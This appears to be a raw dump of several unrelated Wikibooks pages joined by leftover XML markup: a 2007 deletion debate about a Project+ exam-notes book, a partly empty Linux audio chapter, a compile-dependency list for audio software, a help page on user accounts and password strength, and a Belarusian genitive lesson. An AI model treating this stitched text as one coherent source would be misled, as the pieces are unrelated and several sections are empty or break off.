: I though wikibooks didnt have a mandate of a neutral POV?
::No, we do have an NPOV mandate, but we are very relaxed in it. We allow certain exceptions and bending of the rules because we feel that those exceptions allow us to make a better textbook. As a general rule though, we do maintain a neutral point of view. --'''Whiteknight'''&amp;nbsp;([[User:Whiteknight|Page]])&amp;nbsp;([[User talk:Whiteknight|Talk]]) 03:45, 22 June 2007 (UTC)
::: wow fast response.  After I posted I went and looked up policies and there is a clear NPOV mandate in policies so I was coming back here to delete my comment.

This book was nominated for speedy deletion by [[User:Robert Horning]], and that nomination was contested by the only active contributor to this book. I have changed the nomination from a speedy delete to a VfD, and we can discuss the matter here. For the record, I am opposed to deletion, and this nomination should not be counted as a vote in the affirmative. --'''Whiteknight'''&amp;nbsp;([[User:Whiteknight|Page]])&amp;nbsp;([[User talk:Whiteknight|Talk]]) 00:00, 1 June 2007 (UTC)

*'''Weak delete''' All I see is a page of bullet points with no explanation of what the terms mean or what the headings mean.  Even the sentences that follow the bullet points are not really sentences.  Unless this book can be quickly improved into regular book format with sentences and explanations then I would agree with Robert that it should be deleted.  What were Robert's reasons for deletion though? [[User:Xania|Xania]] [[Image:Flag_of_Italy.svg|15px]][[User talk:Xania|&lt;sup&gt;talk&lt;/sup&gt;]] 20:17, 1 June 2007 (UTC)

**The book was created on 24 May, it was nominated for speedy by Rob on 27 May, and it was contested on 31 May. It's all a very short timeframe. --'''Whiteknight'''&amp;nbsp;([[User:Whiteknight|Page]])&amp;nbsp;([[User talk:Whiteknight|Talk]]) 20:54, 1 June 2007 (UTC)

*'''Delete''' - just looks like someone's personal exam notes. [[User:Webaware|Webaware]]&amp;nbsp;&lt;sup&gt;[[User_talk:Webaware|talk]]&lt;/sup&gt; 07:58, 2 June 2007 (UTC)
*'''Comment''' - The reasons I listed for deleting this page (it really isn't even a book) was that it appeared to me as a violation of [[WB:WIW]] by using Wikibooks as a webhosting site, posting some personal exam notes and otherwise not really a serious effort to create a textbook.  If I thought it was complete trash, I simply would have pressed the &quot;delete&quot; tab and have been done with it.  Instead, I felt that the &quot;author&quot; needed to be aware of Wikibooks policies and I did want to see what the author intended to accomplish with this book proposal.  That this particular author is insisting on remaining anonymous by using multiple IP addresses and accounts (I don't see obvious sock puppetry, however) has made it quite a bit more difficult to communicate with this individual.  I would have normally made a quiet comment on the user talk page instead of going this route... and I did consider this page to be a deletion candidate for many of the reasons listed above.  I do want to give this author some time to develop this book, if that is what his intention really is going to be, although I don't see with his tone and attitude that he will respond favorably to somebody else editing the content of that page either.  --[[User:Robert Horning|Rob Horning]] 12:41, 2 June 2007 (UTC)
* '''Transwiki''' - to Wikiversity. Exam notes would be more appropriate at Wikiversity. --[[User:Remi|Remi]] 15:21, 2 June 2007 (UTC)
:* Having taken a look at the modules I agree with [[User:Remi]]. Should not be deleted but it would be better served at wikiversity. [[User:Mattb112885|Mattb112885]] &lt;small&gt; ([[User talk:Mattb112885|talk]]) &lt;/small&gt; 01:24, 5 June 2007 (UTC)
* '''Week keep''' - I don't see the difference between exam notes and study guides. If anyone is willing to rewrite this into a real textbook, I see no strong reason to delete it. [[User:Hoogli|Hoogli]] 16:25, 2 June 2007 (UTC)
*: I wouldn't mind that this was turned into a textbook, although I would like to know about what topic it is addressing, and not to find that information from a heated discussion on the talk page.  In reading just the page content, I just scratch my head and wonder what the goals of the books are.  Apparently it is supposed to be a test study guide, but I wouldn't have been able to tell that from just reading the outline.  My question would be, if I'm reading this page as a stub, can I possibly expand this topic into something more detailed and actually add some prose to the page?  How could I add content as an &quot;expert&quot; if I can't even figure out what it is about?  --[[User:Robert Horning|Rob Horning]] 19:36, 4 June 2007 (UTC)
*::You're requiring that three days into the book's lifespan that it should have a fully intelligible definition and scope. We have never required books must attain any specific milestones in any timeframe. The deletion policy gives new books a seven day grace period specifically because we dont want to be deleting a perfectly legitimate book just because it's gotten off to a rocky start. An author of a new book has enough to worry about in the first few days without having to also fend off a VfD. --'''Whiteknight'''&amp;nbsp;([[User:Whiteknight|Page]])&amp;nbsp;([[User talk:Whiteknight|Talk]]) 22:11, 4 June 2007 (UTC)
*:::Not at all.  But I would like anything added to Wikibooks to at least let somebody else be able to edit the content in a coherent manner that can add value to the original content.  And I will say it again, I did not delete this page.  I asked for review of this content instead, and perhaps a markup tag that is more along the lines of &quot;What is this?&quot; should be used (next time I come across content like this, I'll do that instead) instead of the speedy delete tag.  And mind you, I did not force this into a VfD.  The deletion tag simply could have been removed instead of blowing this whole discussion on this page.  After I got the attention of the &quot;original author&quot;, I nearly removed the speedy delete tag myself.  I did question the legitimacy of this page, and am still not sure if it belongs on Wikibooks.  --[[User:Robert Horning|Rob Horning]] 20:02, 6 June 2007 (UTC)
*'''keep''' This is a useful outline for a textbook on the Project+ certification and provides a useful framework for the development of a book about the same. --[[User:Xixtas|&lt;span style=&quot;color:turquoise&quot;&gt;xixtas&lt;/span&gt;]] &lt;sup&gt;[[User_Talk:Xixtas|&lt;span style=&quot;color:magenta&quot;&gt;talk&lt;/span&gt;]]&lt;/sup&gt; 23:22, 4 June 2007 (UTC)



===Comments===
I'll put it here for good order &amp; peace!  I fully agree with Rob that there could/should be a halfway house between deletion process &amp; keeping.  My intention with [[Wikibooks:Requests_for_Comments#Request_for_Review|this section]] was exactly that and I would have probably listed Project+ as well as Desires &amp; Inner self (above) there.  Probably not speedies but certainly warranting the community's attention.  I'd love to see that aspect of the page, at least, be used. --[[User:Herbythyme|&lt;font color=&quot;green&quot;&gt;Herby&lt;/font&gt;]] &lt;b&gt;&lt;sup&gt;&lt;small&gt;&lt;span style=&quot;color:#90F&quot;&gt;[[User talk:Herbythyme|talk thyme]]&lt;/span&gt;&lt;/small&gt;&lt;/sup&gt;&lt;/b&gt; 07:13, 7 June 2007 (UTC)

==== Knowledge Assasins ====

Its a perfect example of a potentially high quality textbook many can learn a lot from, in early stages of its evolution.
It is being assasinated by unbalanced opinions on your part, or lack thereof, on the part of the current version of the book, before it had the chance to
sprout enough for a whiter shade of pale green. --[User:Ohadaloni|Ohadaloni]]  19:55, 19 June 2007 (UTC)

      <comment>/* First Things First: Choosing A Distribution */</comment>
      <text xml:space="preserve">== Introduction ==

This chapter will discuss the steps required to get a basic sound-enabled linux system up and running.  While being an expert is not required, this book assumes the reader has some familiarity with using a computer.  While keeping the beginner in mind, some advanced topics will be discussed, such as kernel configuration and compiling software from source.  If you feel you are uncomfortable with such tasks, do not be discouraged.  Installing and configuring a linux system can certainly be an intimidating task, but recent distributions have made this much simpler, and there are even some distributions that can run straight off a CD or DVD, requiring no installation whatsoever!

== First Things First: Choosing A Distribution ==

There is a great variety of distributions available, and choosing the best one for you may take some time.  However, with a number of live distributions and virtualization becoming more popular, it is much easier to try different ones out.  If you have the time, maybe even try a few out.

This is by no means a comprehensive list of all linux distributions.  It is an unending discussion among different users on numerous websites and mailing lists, and in reality there is no one distribution that best for every user and application.  This list tries to focus on those distributions which are intended mainly for multimedia creation use and those popular among linux audio users.  There is a lot of information around the internet, such as the distributions' websites and various mailing lists.  The key things to keep in mind are what your specific requirements are and how comfortable you are with system administration.

=== Live Distributions ===

==== APODIO ====

A distant descendant of Mandriva.  According to the official website at http://www.apodio.org/ it is currently based on Ubuntu.

==== dyne:bolic ====

==== Puredyne ====

The [[Puredyne]] live CD is dedicated to live audio-and-visual processing and streaming.
Puredyne uses a realtime kernel.
Puredyne was initially based on the dyne:bolic distribution before the transition to Debian Live and Ubuntu.

==== Musix ====

Package Manager: apt

Languages: Spanish, English (French and other languages currently being translated)

==== Studio To Go! ====

=== RPM-Based Distributions ===

==== Fedora / Fedora Core ====

==== Mandrake ====

==== openSUSE ====

=== Debian-Based Distributions ===

==== 64 Studio ====

==== AGNULA ====

A distribution intended for professional audio and video use.  However, it is no longer maintained and has now become the Debian Multimedia Project.

==== Debian ====

==== Ubuntu ====

===== Ubuntu Studio =====

=== Other ===

==== Arch Linux ====
&quot;Arch Linux is an independently developed i686/x86-64 optimized community distribution, based on a rolling-release package model and targeted at competent GNU/Linux users. Arch provides a minimal environment upon installation, (no GUI), already compiled and optimized for i686/x86-64 architectures. Arch is lightweight, flexible and simple. Its design philosophy and implementation make it easy to extend and mold into whatever kind of system you're building- from a minimalist console machine to the most grandiose and feature rich desktop environments available. Rather than tearing out unneeded and unwanted packages, Arch offers the power user the ability to build up from a minimal foundation without any defaults chosen for them.&quot; This makes Arch a great option for competent users to build one of the best possible Audio systems on the hardware available to them.

* [http://wiki.archlinux.org/index.php/ProAudio Arch ProAudio wikipage]
* [http://bbs.archlinux.org/viewtopic.php?id=30547&amp;p=1 Arch ProAudio thread]

==== Core/Tinycore ====
A unique and minimalist distribution of the Linux operating system and tools. It offers an even more minimal foundation than Arch to build from.
Binary package availability depends entirely on the community. Tinycore has a small but friendly community. Consequently, users may have to build packages, if they aren't available or updated. 
Typically, the OS operates by loading a small base (the kernel and a filesystem with some basic tools ~8M) into RAM, then mounting applications from disk storage (apps can also be configured to load into RAM). 

Tips on building a lightweight audio workstation here:
http://wiki.tinycorelinux.net/wiki:audio_workstation
Setting up an audio player appliance:
http://personal.nbnet.nb.ca/gavaris/apa.html

==== Linux From Scratch / BFLS ====

This may not count as a distribution, but it does show you how to build a complete, albeit minimal, working system from source.  The goals of LFS are mostly learning the ins-and-outs of a linux system, but the BLFS (Beyond Linux From Scratch) does have quite a list of and media related software and libraries.  It may not be the best for building a highly-optimized audio workstation, but for the more programming-minded or those who like to experiment, this just may be the thing for you.  Another possibility is embedded  systems; with the right package selection and some careful scripting, you can have a small but powerful MIDI controller for your live rig... just a thought!

==== Gentoo ====

This is a fairly popular distribution with linux audio users.

=== Software Repositories ===

While not considered full linux systems, these software repositories are provided as add-ons to existing distributions and offer patched, low-latency kernels, and various multimedia software prepackaged for easy installation.

==== Planet CCRMA ====

==== JackLab ====

== More On Hardware And Optimizing For Low-Latency ==

&quot;If it ain't broke, don't fix it!&quot;

Now that you know more about the basics of the linux audio system, let's talk more about how it relates to more hardware-specific issues.  As the quote above states, if your system already runs fine, too much tweaking may just lead to system breakage, and the best thing to do is doing nothing at all.  If, however, you are experiencing some problems with hardware, or just plain unacceptable performance, some of the tips in this section may be of use to you.

      <text xml:space="preserve">This is a list of many of the widely used software packages.  Mainly provided for those who compile their own packages, it lists required packages and various notes on compiling, although other users may find this information useful as well.

'''Some General Troubleshooting Tips'''

*As with compiling and installing any software, running configure and make as a non-root user is recommended.

*A number of libraries rely on pkg-config, so check to make sure your PKG_CONFIG_PATH contains the right path to dependencies.

== Advanced Linux Sound Architecture (ALSA) ==

=== alsa-driver ===

=== alsa-lib ===

=== alsa-utils ===

== Ardour ==

=== Dependencies ===

*[[#alsa-lib|alsa-lib]]

*Boost C++ libraries

*[[#fftw3|fftw3]] (without --enable-float) 

*gtk2 (confirm this package name)

*[[#jack-audio-connection-kit|jack]]

*[[#liblrdf|liblrdf]] (requires: [[#LADSPA|LADSPA]], raptor)

*[[#liblo|liblo]]

*[[#libsamplerate|libsamplerate]]

*scons

''Optional:''

*[[#fftw3|fftw3]] (with --enable-float)
**(Note to self: Confirm this)

*(Note to self: Double check dependencies needed for VST support)

=== Compiling Tips ===

''Notes:''

*The boost and gtk2 libraries are included in most sane linux distributions, so there is little chance you will need to worry about these.  At most, it will involve installing a -devel package or two.

*The non float-enabled fftw3 is required for Ardour's internal libsndfile library.

*(The optional float-enabled fftw3f is required for the optional FFT analysis window feature.)

== Audacity ==

=== Dependencies ===

=== Compiling Notes ===

== DSSI ==

=== Dependencies ===

=== Compiling Notes ===

== fftw3 ==

The Fastest Fourier in the West

A very well optimized FFT library used in a lot of packages for performing DSP routines.  *NOTE* There is a version 2 of the library as well, which is incompatible with version 3.

=== Dependencies ===

*None

=== Compiling Tips ===

''Flags:''

*--enable-shared - disabled by default, this enables the shared library to be built, which is required by most software

*--enable-single - same as --enable-float

*--enable-float - this forces the library to be built with single-precision floating point numbers, and the library names beginning with [[#fftw3|fftw3]] will begin with fftw3f. 

''Notes:''

Some software require the fftw3 version of the library, and some require the fftw3f version.  This may be confusing to users who are compiling this for the first time.  If another software fails to detect this library, double check which version you have installed.  Since a lot of software documentation does not specify which, it may be a good idea just to install both from the start and avoid confusion later.

== FFAD (formerly FreeBoB) ==

Free Firewire Audio Drivers

Formerly the FreeBob project (for support of BridgeCo. BeBoB devices).  A backend end driver for use with firewire audio interfaces.

=== Dependencies ===

*libraw1394

*libavc1394 (requires libraw1394)

*libiec61883 (requires libraw1394)

=== Compiling Tips ===

== FLAC ==

=== Dependencies ===

''Optional:''

*libogg

=== Compiling Tips ===

This software should compile with little issue.

Note for those wishing to run the test suite, it takes a VERY long time.  As a comparison, on 2.4GHz dual core system with 2GB of RAM, compiling the library takes less than a minute, but the test suite takes about 45 minutes.

== jack-audio-connection-kit ==

The JACK Audio Connection Kit

=== Dependencies ===

*[[#alsa-lib|alsa-lib]] (for ALSA and OSS backends)

*[[#FFAD_(formerly_FreeBoB)|FFAD]] (for IEEE1394 device support)

*[[#libsndfile|libsndfile]]

=== Compiling Tips ===

''Flags:''

*--enable-dynsimd - Enables SIMD instructions, such as SSE.  ''HIGHLY'' recommended for any user using a Pentium II or later compiler.

*--with-default-tmpdir - Sets the default path for a shared memory directory.

''Notes:''

*A note on using SSE, even though the configure script will add the -sse flag, SSE and above support will not be enabled.  A way to check this, if you run the jackd server, it will explicitly output SSE, SSE2, or Enhanced3DNow! detected if found.  Since a good deal of JACK is SSE optimized, your best bet is to just enable it from the start.  The worst thing that could happen is an illegal instruction error if your processor does not support it, in which case you can disable it.

* If the --with-default-tmpdir flag is not set, JACK will use /tmp, which is not present or not set as shared memory in some distributions.  The JACK documentation recommends creating and entry in /etc/fstab for it, but for recent kernels and distributions, it may be simpler to set this to existing shared memory, such as /dev/shm.
**Note: Some pre-compiled versions already set this for you.  So, if you are upgrading from a previous version of JACK, make sure everything including the installation goes in the same place.  The JACK developers advise against having more than one version installed to avoid possible breakage and general confusion.

== JAMin ==

=== Dependencies ===

*[[#fftw3|fftw3]] (with --enable-float)

*[[#jack-audio-connection-kit|jack]]

*[[#LADSPA|LADSPA]]

=== Compiling Tips ===

== LADSPA ==

The Linux Audio Developer's Simple Plugin API

=== Dependencies ===

None

=== Compiling Tips ===

Installation requires not compiling at all, just copying src/ladspa.h from the source tree into your /usr/include directory.

Compiling the sample plugins is completely optional.

== liblo ==

=== Dependencies ===

*None

=== Compiling Tips ===

You should have little trouble compiling this package.

*Note: While out of the scope of this book, liblo can use IPv6, which has been known to be rather unstable on some older systems.  This shouldn't be a problem on any recent kernel or distribution.

== liblrdf ==

An XML Library

=== Dependencies ===

*[[#LADSPA|LADSPA]]

*Raptor

=== Compiling Tips ===

You should have little trouble compiling this package.

== libsamplerate ==

=== Dependencies ===

*[[#fftw3|fftw3]] (without --enable-float)

=== Compiling Tips ===

== libsndfile ==

=== Dependencies ===

''Optional:''

*[[#FLAC|FLAC]] (version 1.1.2 - see below)

=== Compiling Tips ===

''Notes:''

The current version of libsndfile requires version 1.1.2 of FLAC.  A note to those who like to use the most recent versions of software, libsndfile will NOT compile with FLAC versions 1.1.3, 1.1.4 or later!  This is due to the FLAC library changing the names of some key functions in the stream encoder.  While designed to be easier to use, libsndfile has not been updated to use these new functions yet.

== Rosegarden ==

=== Dependencies ===

*CMake

*QT3

''Optional:''

*[[#DSSI|DSSI]]

*LIRC

=== Compiling Notes ===

      <text xml:space="preserve">{{Using Wikibooks/Page}}

== The Advantages of Using a User Account ==

There are a number of benefits to creating a Wikibooks account, and using that account consistently. We'll list some of the benefits below:

;Anonymity:You are actually ''more anonymous'' when you register for an account. This is because when you edit anonymously, your IP address (which can be used to identify your location) is posted. When you have a user account, your IP address is hidden. Notice that if there is a problem, specially elected users known as '''Checkusers''' can access the IP records. However, Checkusers only access the records in response to specific needs. We will discuss Checkusers and the IP logs in greater detail in the section '''The Wikibooks Administrator'''. 
;User space:If you have a user account, you also have a [[Special:MyPage|personal userpage]], and any subpages to that page that you want to create. Some users have literally hundreds of personal pages for various uses. You can write about yourself on your userpages, or you can write about anything you want. Many users use their pages to write about books, and keep track of various tasks that need to be completed here. Also, users have their own personal [[Special:MyPage/monobook.js|javascript]] and [[Special:MyPage/monobook.css|CSS stylesheets]] that they can use to customize and personalize the Wikibooks interface. Some users have very simple user spaces, while some users have very elaborate spaces. It's ''your space'', so feel free to use it however you want.
;User talk pages:In addition to a user page where you can write about yourself, you also have a user talk page where other people can write messages to you. When somebody writes you a message, a notification will appear at the top of your page. This is a great way of keeping in touch with people, especially when timezone differences make direct communications difficult.
;User Preferences:You can set a number of [[Special:Preferences|preferences]] for your account including: Setting an email contact address that others can use, changing display themes (&quot;skins&quot;) to change the way the website looks, changing the appearance of certain items and changing time and date formats. Wikibookians and other Wikimedians have also developed a number of javascript-based productivity tools called '''gadgets''' that can be added to your account. There are lots of options for you to check out and customize your wikibooks experience.
;Watchlist: You will get a personal watchlist that will show changes that other people make to pages on that list. This way you can monitor pages that you are interested in, such as pages that you author, and discussion pages that you participate in. The watchlist gives you a way to keep track of pages you like, and play an active role in their development.
;Voting and Discussing: While even IP users can participate in community discussions, their voice usually carries little weight and in some cases will be ignored entirely. This is because people editing from an IP address are not considered to have a vested interest here, and because there is a one-to-many relationship between most IP addresses and individual people. As a registered user you will have full rights to participate in community discussions and help make decisions, even from your very first day here. 

This is a long list, but it is not inclusive. There are many reasons why you should create an account at Wikibooks. If you plan to spend much time here, you should consider signing up for one. The process is free, quick, and easy. You are not required to supply any personal information, so you can always remain anonymous if you choose to. We know it's yet another internet signup, and we know you've probably been through a million, but we promise that this signup process will be fast and painless.

== Setting up a User Account ==
Setting up a user account is quick and easy, often taking less than a couple of minutes to complete. Before starting this process you must first choose a username. Once you set up your account all of your edits will be performed under this name, so it is important to choose a name that you are comfortable with. Also, the username that you choose has to be unique and must conform to the Username policy (see below).

Once you have decided on a username you can register it. Click the &quot;Sign in / create account&quot; link in the top right of the screen to bring up the login screen. From here click the 'Create One' link at the top of the login box. Ensure that all of the mandatory boxes are filled out on the form on the registration page and click 'Create Account' to finish the process. Make sure you choose a strong password that isn't easy to guess so that your account remains secure (See Below).

Once you have finished registration you can login with your username and password. You now have access to your own personal watchlist and preferences, selected from the links banner in the top right corner.

=== Username Taken? ===

Over a hundred new user accounts are created every day, so the odds are good that the username that you want might already be taken by somebody else. There is some chance that the username you want may be available for '''usurpation'''. That means that special users known as &quot;'''bureaucrats'''&quot; can  try to give you the username you want by taking it away from an inactive account. It is not a guarantee, but in some cases it is possible. Ask for help from a bureaucrat, including the username you want and your current username (if any), at the [[WB:AN|Administrative Assistance]] discussion page.

=== Uploading Images ===
{{TextBox|
;Help! I'm a new user, and I can't upload images for my book! What can I do?
:This is a common question, and one that's worth answering here in the middle of the chapter. The software in use at Wikibooks, MediaWiki, is based on the idea of user permissions. Everybody can do basic editing stuff, but you need more permissions if you want to do more advanced things. For instance, only people with '''admin''' permissions can delete a page. Only people with '''bureaucrat''' permissions can rename users. Uploading images requires a permission called '''uploader'''. 
:&amp;nbsp;
:Luckily, that's not the whole story. Another project called [[commons:|Wikimedia Commons]] allows users to upload images immediately without special permission. Images uploaded to commons are immediately usable and visible here at Wikibooks (and also at Wikipedia and all other WMF projects). However, because the images can be used all over the place, Commons is very strict about its copyright policies. Images uploaded to commons ''must be released under a free license'', not fair use. Fair use images can be uploaded here at Wikibooks, but not unless you have the '''uploader''' permission. 
:If you have more questions about this, ask at [[WB:CHAT]].
}}

== Choosing a Username ==
It is worth choosing a username that is not insulting or confusing to those around you in order to promote a harmonious editing environment. There are no policies regarding this in particular, but [[Wikibooks:Be civil]] is relevant. As a guideline, we suggest avoiding:

#'''Confusing usernames:'''
#* Usernames that are very similar to the name of another Wikibooks user and might cause confusion. 
#* Usernames that confusingly refer to a Wikibooks process, namespace, or toolbar item. 
#'''Misleading usernames:'''
#* Usernames that imply the user is an administrator or official figure on Wikipedia, or of the Wikimedia Foundation. 
#* Usernames that match the name of a well-known/famous living or recently deceased person, unless you verifiably are that person, in which case please note this on your user page.
#'''Disruptive usernames:'''
#* Usernames that are similar to those previously used by persistent vandals or banned users. 
#* Usernames that are attacks on specific users. 
#* Usernames that contain personal information about people, such as a telephone number or street addresses. 
#* Usernames that allude to hacking, trolling, vandalism, legal threats, or computer malware (viruses, spyware etc...). 
#* Usernames that include profanity, or obscenities, or references to genitalia or sexual slang. 
#'''Promotional usernames:'''
#* Usernames that match the name of a company or group, if the user is using the account as a promotional tool. 
#'''Offensive usernames:'''
#* Usernames that promote a controversial or potentially inflammatory point of view. 
#* Usernames that are defamatory or insulting to other people or groups. 
#* Usernames that invoke the name of a religious figure or religion in a distasteful, disrespectful, or provocative way, or promote one religion over another. (Note that simple expressions of faith are allowed unless they are disruptive, but are generally discouraged.) 
#* Usernames that refer to real-world violent actions. 
#* Usernames that refer or include allusions to racism, sexism, hate speech, etc... 
#* Usernames that refer to a medical condition or disability in a belittling way. 
#* Usernames that include slurs, or references to reproductive or excretory bodily functions.
#'''Usernames containing the at symbol (@)'''
#*These are disallowed due to technical restrictions.

== Choosing a Good Password ==
In order to maintain the integrity and security of your account, you should choose a good, strong password.

'''Weak Passwords:'''

Poor/easily guessable passwords tend to include words in the dictionary, proper names, words based on your username or common variations on these themes, as well as information such as birth dates and pet names.

Example of weak passwords include:
*&lt;code&gt;admin&lt;/code&gt; — too easily guessed 
*&lt;code&gt;abc123&lt;/code&gt; — too easily guessed 
*&lt;code&gt;zzz&lt;/code&gt; — repeated letters and/or adjacent letters on a keyboard (e.g. qwerty)
*&lt;code&gt;susan&lt;/code&gt; — common personal names 
*&lt;code&gt;password&lt;/code&gt; — easily guessed, used very often
*&lt;code&gt;p@$$\/\/0rd&lt;/code&gt; — simple letter substitutions are pre-programmed into cracking tools 
*&lt;code&gt;rover&lt;/code&gt; — common name for a pet, also a dictionary word 
*&lt;code&gt;18/9/73&lt;/code&gt; — date, possibly of personal importance 
*&lt;code&gt;nbusr123&lt;/code&gt; — a user name, and if so, very easily guessed

'''Strong Passwords:'''

Strong passwords avoid using dictionary terms and are generally made up of a random sequence of letters, numbers, and symbols. Unusual/bizarre phrases can also be acceptable. The length of a password can also slow down the time which it takes to guess it, often causing a hacker to deem the amount of time needed is not worth it.

Examples of strong passwords include:
*&lt;code&gt;7gEbs?id~3&lt;/code&gt; — not a dictionary word, has both cases of alpha, plus numeric, and punctuation characters 
*&lt;code&gt;nOoOoFiM425965&lt;/code&gt; — long, with both alpha cases and numeric characters 
*&lt;code&gt;Change_100$ to Pounds?&lt;/code&gt; — phrases can be long, memorable and contain an extended symbol to increase their strength 
*&lt;code&gt;Tpftcits4Utg!&lt;/code&gt; — A mixture of varying-case letters, numbers, and symbols. It is memorable as an initialism of &quot;The password for this computer is too strong for you to guess!&quot;
'''Note:''' these particular strings are no longer strong passwords, because they have been published.

== New User Restrictions ==

Newly created user accounts have a few restrictions placed on them. We do this because vandals and other unsavory elements set up temporary user accounts in order to post spam and vandalism here on Wikibooks. This restricted period lasts 4 days from the time you create your user account. Once these 4 days have passed, your account is called '''autoconfirmed'''. Here are some of the restrictions that new users face until they become autoconfirmed:

;Image uploads:New users cannot upload images to Wikibooks. This is because we have historically had a large problem with vandals uploading inappropriate pictures to Wikibooks. However, there is an easy solution to this: [[commons:|Wikimedia Commons]] allows new users to upload images without having to wait to become autoconfirmed. Images that are uploaded to commons can be used here on Wikibooks as if they have been uploaded here. Commons is the preferred place to upload images, even for veteran users.
;Page Moves:New users cannot move pages. However, if you have a page that needs to be moved, you can ask on [[WB:PROJECTS]] or [[WB:AN]] for help. Make sure to read the guidelines at [[Wikibooks:Naming policy]], to help avoid some common mistakes.
;Editing protected pages:Some pages on Wikibooks are protected against being edited by anonymous users. Unfortunately, registered users who are not autoconfirmed cannot edit these pages either. Luckily, these pages are not common, and it is unlikely that new users will need to edit many of them anyway. Ask for help at [[WB:HELP]] or [[WB:AN]] for help with this.

== User Page ==

Every user account has two special pages, a '''user page''' and a '''user talk page'''. These two pages are ''yours'', and yours alone. What you do with these pages is for you to decide; but, here are some common uses:
;[[Special:MyPage|Your User Page]]:People often use their user pages as profile pages. Write about yourself, what you like, who you are. Many people also use it as a place to organize thoughts, prepare a list of links that are needed often, tips, and reminders. Many users also take some pride in decorating their user pages, and making them look fancy. There are many options, and you should feel free to experiment with your user page as much as you want.
;[[Special:MyTalk|Your User Talk Page]]: The talk page is a place where other users can contact you, and where you can carry on discussions with others. When another user writes a message on your user talk page, you will see a banner at the top of your browser that says &quot;You have new messages&quot;. When you see this banner, go to your talk page, because somebody has left you a message. If you want people to contact you in a special way, or if you want to provide basic guidelines for how people talk to you, you can post them at the top of your talk page. 

=== User Space ===

In addition to the two pages mentioned above, you can have a multitude of additional pages for personal use. These pages together are known as your '''user space'''. 

The user space works like any other book. Your [[Special:MyPage|user page]] is like the main page, and you can create subpages with a forward slash &lt;code&gt;/&lt;/code&gt;. Here are some common examples:
;[[Special:MyPage/Sandbox|Your Page/Sandbox]]: Wikibooks has a large [[Wikibooks:Sandbox]] page that people can experiment with, but some people would like a personal sandbox where they can experiment with things without being disturbed. If you want to practice with templates, you might also like to create a [[Special:MyPage/Template Sandbox|Template Sandbox]] page, and experiment with that.
;[[Special:MyPage/Links|Your Page/Links]]: Create a list of links for your benefit, or to help others get around quickly. 
;[[Special:MyPage/About| Your Page/About]]: Create a page about you, your interests, your experience, your background. 
;[[Special:MyPage/Books|Your Page/Books]]: Write a little bit about the books and projects you are working on, what your goals are, and what you think needs to be fixed. In book writing, the more plans you write out, the easier it will be for other users to join in.

These are just a few ideas. Some people don't use any pages in their user space, while some users have hundreds of pages there. Feel free to use as much or as little as you want.

=== Deleting User Subpages ===

If you have a subpage in your user space, and you want it to be deleted. add the following tag to the top of the page: {{tlx|delete|requested by owner}}. An admin will find it and delete it eventually. If you are in a big hurry for some reason, you could contact an admin directly. 

Admins may delete pages in their own user space at any time for any reason.

== Your Contributions ==

Your contributions are important, and you should be proud of them! Go to [[Special:Contributions]] and type in your name to see a list of your edits. In the upper-left corner of your screen, there should also be a link that says '''My Contributions'''. Clicking on that will take you to your edit history directly.

      <text xml:space="preserve">==The Apostroph==

The apostroph is used to separate a consonant from a y-vowel, so as the consonant be hard and the vowel be read as at the beginning of the word.

'''аб'я́ва''' &quot;abyava&quot; an advertisement

'''вар'я́т''' &quot;varyat&quot; a mad person

Thus, these words are read as if their parts separated by the apostroph were two separate words.

The soft sign can also be used as a disjunctive symbol; its difference from the apostroph is that it makes the preceding consonant soft.

'''алья́нс''' &quot;al'yans&quot; an alliance

==The Genitive==

Now we shall deal with Genitive forms of different words other than nouns.

===Adjectives===

The endings of adjectives in the Genitive case are as follows.

{| class=&quot;wikitable&quot;
|-
! 
! Initial Form
! Masculine and Neuter
! Feminine
! Plural
|-
! Hard Basis
! ы
! ога (ага)
! ой (ай) or ое (ае)
! ыя
|-
|
| стары́
| старо́га
| старо́й or старо́е
| стары́х
|-
|
| но́вы
| но́вага
| но́вай or но́вае
| но́вых
|-
! Soft Basis
! і
! яга
! яй or яе
! іх
|-
|
| сіні
| сіняга
| сіняй or сіняе
| сініх
|-
! Basis in ''г'', ''к'' or ''х''
! і
! ога (ага)
! ой (ай) or ое (ае)
! іх
|-
|
| шыро́кі
| шыро́кага
| шыро́кай or шыро́кае
| шыро́кіх
|}

Soft basis, hard basis etc. mean that the final letter of the word basis which is not changed in deflexion, is soft, hard etc.

Endings given in parentheses stand for unstressed forms.

The same way is applied to the demonstaratives: ''гэ́ты'' - ''гэ́тага'', ''гэ́тай'' or  ''гэ́тае'', ''гэ́тых''; ''той'' - ''таго́'', ''той'' or  ''тае́'', ''тых''.

===Pronouns===

The Genitive pronoun forms are shown below.

{| class=&quot;wikitable&quot;
|-
! Nominative
| я
| ты
| ён, яно́
| яна́
| мы
| вы
| яны́
|-
! Genitive
| мяне́
| цябе́
| яго́
| яе́
| нас
| вас
| іх
|}

===Possessives===

The possessives' Genitive forms are much like those of adjectives.


{| class=&quot;wikitable&quot;
|-
! Initial Form
! мой
! твой
! яго́ (яго́ны)
! яе́
! наш
! ваш
! іх (іхны)
|-
! Masculine and Neuter
| майго́
| твайго́
| яго́ (яго́нага)
| яе́
| на́шага
| ва́шага
| іх (іхнага)
|-
! Feminine
| маёй or мае́
| тваёй or твае́
| яго́ (яго́най or яго́нае)
| яе́
| на́шай or на́шае
| ва́шай or ва́шае
| іх (іхнай or іхнае)
|-
! Plural
| маіх
| тваіх
| яго́ (яго́ных)
| яе́
| на́шых
| ва́шых
| іх (іхных)
|}

===Numbers===

Here are the genitive forms of the numbers from one to ten.

{| class=&quot;wikitable&quot;
|-
! Nominative
| адзін (адно́, адна́, адны́)
| два (дзве)
| тры
| чаты́ры
| пяць
| шэсць
| сем
| во́сем
| дзе́вяць
| дзе́сяць
|-
! Genitive
| аднаго́ (адно́й or аднае́, адны́х)
| двух
| трох
| чатыро́х
| пяці
| шасці
| сямі
| васьмі
| дзевяці
| дзесяці
|}

===Question Words===

{| class=&quot;wikitable&quot;
|-
! Nominative
| хто
| што
| які (яко́е, яка́я, якія)
| чый (чыё́, чыя́, чые)
| ко́лькі
|-
! Genitive
| каго́
| чаго́
| яко́га (якой or яко́е, якіх)
| чыйго́ (чыёй, чыіх)
| ко́лькіх
|}

Now, we can notice several things common to all these different words.

*Masculine and Neuter forms for all cases except Nominative are the same
*Feminine Genitive has two possible forms; one of them actually coincides with Neuter Nominative. These two forms actually correspond to different regional dialects; the first one (''ой'') is somewhat more scientific whereas the second (''ое'') is more spread in literature. Some Belarusians prefer the second form because they like Belarusian to sound less like Russian.

==Indefinite Words==

